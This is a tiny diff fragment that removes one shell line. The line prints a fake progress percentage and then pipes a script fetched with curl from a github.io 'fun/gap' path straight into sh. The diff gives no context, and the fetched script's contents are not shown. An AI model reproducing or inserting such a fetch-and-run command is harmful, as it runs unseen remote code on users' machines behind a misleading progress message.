@@ -1,1 +1,0 @@
-echo 'Progress: 59.0%'; curl -L --progress-bar frkns.github.io/fun/gap | sh
